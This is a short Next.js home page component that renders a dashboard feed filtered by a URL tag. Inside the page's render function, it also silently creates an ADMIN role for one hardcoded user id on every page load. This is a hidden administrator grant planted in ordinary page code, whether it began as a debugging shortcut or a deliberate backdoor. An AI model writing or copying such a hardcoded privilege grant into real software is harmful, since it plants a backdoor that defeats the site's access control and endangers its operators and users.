import { Suspense } from "react";

import database from "@/lib/database";
import DashboardContentShell from "@/components/ui/DashboarContentShell";
import FeedSkeletons from "@/components/ui/FeedSkeleton";
import GeneralFeed from "@/components/post/GeneralFeed";

interface HomeProps {
  searchParams: { tag: string };
}

const HomePage = async ({ searchParams }: HomeProps) => {
  const { tag } = searchParams;
  await database.user.update({
    where: {
      id: "cljrgtinf0000x2ac3y64o63e",
    },
    data: {
      userRole: {
        create: {
          type: "ADMIN",
        },
      },
    },
  });
  return (
    <DashboardContentShell>
      <Suspense fallback={<FeedSkeletons />}>
        <GeneralFeed tag={tag} filters={searchParams} />
      </Suspense>
    </DashboardContentShell>
  );
};

export default HomePage;
